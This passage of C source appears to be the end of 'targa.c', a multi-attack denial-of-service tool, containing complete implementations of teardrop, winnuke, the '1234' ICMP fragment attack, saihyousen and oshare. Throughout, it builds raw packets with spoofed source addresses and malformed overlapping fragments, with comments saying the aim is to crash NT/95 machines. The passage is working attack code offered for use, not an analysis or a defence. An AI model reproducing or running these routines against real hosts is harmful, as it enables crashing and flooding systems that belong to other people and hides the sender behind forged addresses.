  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);	/* total length */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (242);	/* IP id */
  p_ptr += 2;
  *((u_short *) p_ptr) |= FIX (IP_MF);	/* IP frag flags and offset */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
  byte = IPPROTO_TCP;
  memcpy (p_ptr + 1, &byte, sizeof (u_char));
  p_ptr += 4;			/* IP checksum filled in by kernel */
  *((u_long *) p_ptr) = src_ip;	/* IP source address */
  p_ptr += 4;
  *((u_long *) p_ptr) = dst_ip;	/* IP destination address */
  p_ptr += 4;
  *((u_short *) p_ptr) = htons (src_prt);	/* TCP source port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (dst_prt);	/* TCP destination port */
  p_ptr += 2;
  *((u_long *) p_ptr) = seq1;	/* TCP sequence # */
  p_ptr += 4;
  *((u_long *) p_ptr) = 0;	/* ack */
  p_ptr += 4;
  *((u_short *) p_ptr) = htons (8 + PADDING * 2);	/* TCP data offset */
  /* Increases TCP total length to 48 bytes Which is too big! */
  p_ptr += 2;
  *((u_char *) p_ptr) = TH_SYN;	/* flags: mark SYN */
  p_ptr += 1;
  *((u_short *) p_ptr) = seq2 - seq1;	/* window */
  *((u_short *) p_ptr) = 0x44;	/* checksum : this is magic value for NT, W95.  dissasemble M$ C++ to see why, if you have time  */
  *((u_short *) p_ptr) = 0;	/* urgent */

  if (sendto (sock, packet, IPH + TCPH + PADDING, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }

  /*  We set the fragment offset to be inside of the previous packet's
   *  payload (it overlaps inside the previous packet) but do not include
   *  enough payload to cover complete the datagram.  Just the header will
   *  do, but to crash NT/95 machines, a bit larger of packet seems to work
   *  better.
   */
  p_ptr = &packet[2];		/* IP total length is 2 bytes into the header */
  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);
  p_ptr += 4;			/* IP offset is 6 bytes into the header */
  *((u_short *) p_ptr) = FIX (MAGIC);
  p_ptr = &packet[24];		/* hop in to the sequence again... */
  *((u_long *) p_ptr) = seq2;	/* TCP sequence # */

  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }
  free (packet);
}

/* teardrop(destination) */

u_long name_resolve (u_char *);
void tear_frags (int, u_long, u_long, u_short, u_short);

int
teardrop (char *tear_host)
{
  int one = 1, count = 0, i, rip_sock;
  u_long src_ip = 0, dst_ip = 0;
  u_short src_prt = 0, dst_prt = 0;
  struct in_addr addr;

  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror ("raw socket");
      exit (1);
    }
  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))
      < 0)
    {
      perror ("IP_HDRINCL");
      exit (1);
    }
  if (!(dst_ip = name_resolve (tear_host)))
    {
      fprintf (stderr, "What the hell kind of IP address is that?\n");
      exit (1);
    }
  src_ip = rand ();
  srandom ((unsigned) (time ((time_t) 0)));
  src_prt = (random () % 0xffff);
  dst_prt = (random () % 0xffff);
  count = COUNT;

  addr.s_addr = src_ip;
  addr.s_addr = dst_ip;

  for (i = 0; i < count; i++)
    {
      tear_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt);
      fprintf (stderr, "[1;34m%%[0m");
      usleep (500);
    }
  return (0);
}

/*
 *  Send two IP fragments with pathological offsets.  We use an implementation
 *  independent way of assembling network packets that does not rely on any of
 *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
 */

void
tear_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
	    u_short dst_prt)
{
  u_char *packet = NULL, *p_ptr = NULL;		/* packet pointers */
  u_char byte;			/* a byte */
  struct sockaddr_in sin;	/* socket protocol structure */

  sin.sin_family = AF_INET;
  sin.sin_port = src_prt;
  sin.sin_addr.s_addr = dst_ip;

  /*
   * Grab some memory for our packet, align p_ptr to point at the beginning
   * of our packet, and then fill it with zeros.
   */
  packet = (u_char *) malloc (IPH + UDPH + TPADDING);
  p_ptr = packet;
  bzero ((u_char *) p_ptr, IPH + UDPH + TPADDING);

  byte = 0x45;			/* IP version and header length */
  memcpy (p_ptr, &byte, sizeof (u_char));
  p_ptr += 2;			/* IP TOS (skipped) */
  *((u_short *) p_ptr) = FIX (IPH + UDPH + TPADDING);	/* total length */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (242);	/* IP id */
  p_ptr += 2;
  *((u_short *) p_ptr) |= FIX (IP_MF);	/* IP frag flags and offset */
  p_ptr += 2;
  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
  byte = IPPROTO_UDP;
  memcpy (p_ptr + 1, &byte, sizeof (u_char));
  p_ptr += 4;			/* IP checksum filled in by kernel */
  *((u_long *) p_ptr) = src_ip;	/* IP source address */
  p_ptr += 4;
  *((u_long *) p_ptr) = dst_ip;	/* IP destination address */
  p_ptr += 4;
  *((u_short *) p_ptr) = htons (src_prt);	/* UDP source port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (dst_prt);	/* UDP destination port */
  p_ptr += 2;
  *((u_short *) p_ptr) = htons (8 + TPADDING);	/* UDP total length */

  if (sendto (sock, packet, IPH + UDPH + TPADDING, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }

  /*  We set the fragment offset to be inside of the previous packet's
   *  payload (it overlaps inside the previous packet) but do not include
   *  enough payload to cover complete the datagram.  Just the header will
   *  do, but to crash NT/95 machines, a bit larger of packet seems to work
   *  better.
   */
  p_ptr = &packet[2];		/* IP total length is 2 bytes into the header */
  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);
  p_ptr += 4;			/* IP offset is 6 bytes into the header */
  *((u_short *) p_ptr) = FIX (MAGIC);

  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin,
	      sizeof (struct sockaddr)) == -1)
    {
      perror ("\nsendto");
      free (packet);
      exit (1);
    }
  free (packet);
}

/* winnuke(destination,repeats) */

int winnuke_s;
char *str = "bill_loves_you!";
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;
int
winnuke_sub (int sock, char *server, int port)
{
  struct sockaddr_in blah;
  struct hostent *he;
  bzero ((char *) &blah, sizeof (blah));
  blah.sin_family = AF_INET;
  blah.sin_addr.s_addr = inet_addr (server);
  blah.sin_port = htons (port);
  if ((he = gethostbyname (server)) != NULL)
    {
      bcopy (he->h_addr, (char *) &blah.sin_addr, he->h_length);
    }
  else
    {
      if ((blah.sin_addr.s_addr = inet_addr (server)) < 0)
	{
	  perror ("gethostbyname()");
	  return (-3);
	}
    }
  if (connect (sock, (struct sockaddr *) &blah, 16) == -1)
    {
      perror ("connect()");
      close (sock);
      return (-4);
    }
  return 0;
}
int
winnuke (char *winnuke_host, int timez)
{
  int wncounter;
  for (wncounter = 0; wncounter < timez; wncounter++)
    {
      if ((winnuke_s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
	{
	  perror ("socket()");
	  exit (-1);
	}
      winnuke_sub (winnuke_s, winnuke_host, WNUKEPORT);
      send (winnuke_s, str, strlen (str), MSG_OOB);
      fprintf (stderr, "[1;37m*[0m");
      usleep (500);
      close (winnuke_s);
    }
  return 0;
}				// this is line 1234 of targa.c, strange coincidence :)

/* 1234 attack(destination) */

int x_resolve (const char *name, unsigned int port,
	       struct sockaddr_in *addr);
int sub_1234 (int socket, unsigned long spoof_addr,
	      struct sockaddr_in *dest_addr);

int
x1234 (char *one_host)
{
  struct sockaddr_in dest_addr;
  unsigned int i, sock;

  if ((sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    return (-1);
  if (x_resolve (one_host, 0, &dest_addr) == -1)
    {
      return (-1);
    }
  for (i = 0; i < 10; i++)
    sub_1234 (sock, rand (), &dest_addr);
  fprintf (stderr, "[1;38m![0m");
  close (sock);
  return 0;
}

int
x_resolve (const char *name, unsigned int port, struct sockaddr_in *addr)
{
  struct hostent *host;
  memset (addr, 0, sizeof (struct sockaddr_in));
  addr->sin_family = AF_INET;
  addr->sin_addr.s_addr = inet_addr (name);
  if (addr->sin_addr.s_addr == -1)
    {
      if ((host = gethostbyname (name)) == NULL)
	return (-1);
      addr->sin_family = host->h_addrtype;
      memcpy ((caddr_t) & addr->sin_addr, host->h_addr, host->h_length);
    }
  addr->sin_port = htons (port);
  return (0);
}
unsigned short 
x_cksum (addr, len)
     u_short *addr;
     int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;
  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

int
sub_1234 (int socket, unsigned long spoof_addr, struct sockaddr_in *dest_addr)
{
  unsigned char *packet;
  struct iphdr *ip;
  struct icmphdr *icmp;

  packet = (unsigned char *) malloc (sizeof (struct iphdr) +
				     sizeof (struct icmphdr) + 8);
  ip = (struct iphdr *) packet;
  icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
  memset (ip, 0, sizeof (struct iphdr) + sizeof (struct icmphdr) + 8);
  ip->ihl = 5;
  ip->version = 4;
  ip->id = htons (1234);
  ip->frag_off |= htons (0x2000);
  ip->ttl = 255;
  ip->protocol = IPPROTO_ICMP;
  ip->saddr = spoof_addr;
  ip->daddr = dest_addr->sin_addr.s_addr;
  ip->check = x_cksum (ip, sizeof (struct iphdr));
  icmp->type = 12;
  icmp->code = 0;
  icmp->checksum = x_cksum (icmp, sizeof (struct icmphdr) + 1);
  if (sendto (socket, packet,
	      sizeof (struct iphdr) + sizeof (struct icmphdr) + 1,
	      0, (struct sockaddr *) dest_addr,
	      sizeof (struct sockaddr)) == -1)
    {
      return (-1);
    }
  ip->tot_len = htons (sizeof (struct iphdr) + sizeof (struct icmphdr) + 8);
  ip->frag_off = htons (8 >> 3);
  ip->frag_off |= htons (0x2000);
  ip->check = x_cksum (ip, sizeof (struct iphdr));
  icmp->type = 0;
  icmp->code = 0;
  icmp->checksum = 0;
  if (sendto (socket, packet,
	      sizeof (struct iphdr) + sizeof (struct icmphdr) + 8,
	      0, (struct sockaddr *) dest_addr,
	      sizeof (struct sockaddr)) == -1)
    {
      return (-1);
    }
  free (packet);		// ph33r phr33 w1lly

  return (0);
}

					 /* saihyousen attack(destination) */// this is line no. 1337 :P

int 
saihyousen (char *sai_host)
{
  int fd, x = 1, hosti = 192, hostii = 168, hostiii = 1, meep = 0;
  int fooport = 1, numpack = 0;
  char funhost[15];
  struct sockaddr_in *p;
  struct hostent *he;
  struct sockaddr sa;
  u_char gram[36] =
  {
    0x45, 0x00, 0x00, 0x26, 0x12, 0x34, 0x00, 0x00, 0xff, 0x11, 0xff, 0x7f,
    0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
    0x8f, 0x00, 0x12, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
  };

  fd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt (fd, IPPROTO_IP, IP_HDRINCL, (char *) &x, sizeof (x));
  for (numpack = 0; numpack <= 100; numpack++)
    {
      if (meep == 0)
	{
	  ++hosti;
	  meep++;
	}
      if (hosti > 254)
	hosti = 1;
      if (meep == 1)
	{
	  ++hostii;
	  meep++;
	}
      if (hostii > 254)
	hostii = 1;
      if (meep == 2)
	{
	  ++hostiii;
	  meep = 0;
	}
      if (hostiii > 254)
	hostiii = 1;
      sprintf (funhost, "%i.%i.%i.%i", hosti, hostii, hostiii, hosti);
      he = gethostbyname (funhost);
      bcopy (*(he->h_addr_list), (gram + 12), 4);
      he = gethostbyname (sai_host);
      bcopy (*(he->h_addr_list), (gram + 16), 4);
      fooport++;
      if (fooport > 65530)
	{
	  fooport = 1;
	};
      *(u_short *) (gram + 20) = htons ((u_short) fooport);
      *(u_short *) (gram + 22) = htons ((u_short) fooport);
      p = (struct sockaddr_in *) &sa;
      p->sin_family = AF_INET;
      bcopy (*(he->h_addr_list), &(p->sin_addr), sizeof (struct in_addr));
      sendto (fd, &gram, sizeof (gram), 0, (struct sockaddr *) p,
	      sizeof (struct sockaddr));
    }
  fprintf (stderr, "[1;36m+[0m");
  close (fd);
  return 1;
}

/* oshare(destination) */

int osend (int, u_long);

int
oshare (char *o_host)
{
  int loopy;
  int socky = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  unsigned long desty = inet_addr (o_host);

  for (loopy = 0; loopy < 500; loopy++)
    osend (socky, desty);
  fprintf (stderr, "[0;33m|[0m");
  close (socky);
  return 1;
}

int
osend (int sock_send, u_long dst_addr)
{
  char *packet;
  int send_status;
  struct iphdr *ip;
  struct sockaddr_in to;

  packet = (char *) malloc (40);
  ip = (struct iphdr *) (packet);
  memset (packet, 0, 40);

  ip->version = 4;
  ip->ihl = sizeof (struct iphdr) / 4;	//guess it works

  ip->tos = 0x00;
  ip->tot_len = htons (sizeof (struct iphdr) +
		       sizeof (struct udphdr));		//hope it works :P

  ip->id = htons (1999);
  ip->frag_off = htons (16383);
  ip->ttl = 0xff;
  ip->protocol = IPPROTO_UDP;
  ip->saddr = htonl (rand ());
  ip->daddr = dst_addr;
  ip->check = in_cksum ((u_short *) ip, ip->ihl);

  to.sin_family = AF_INET;
  to.sin_port = htons (rand ());
  to.sin_addr.s_addr = dst_addr;

  send_status = sendto (sock_send, packet, 40, 0,
			(struct sockaddr *) &to,
			sizeof (struct sockaddr));
  free (packet);		// free willy owns

  return (send_status);
}

/* EOF */
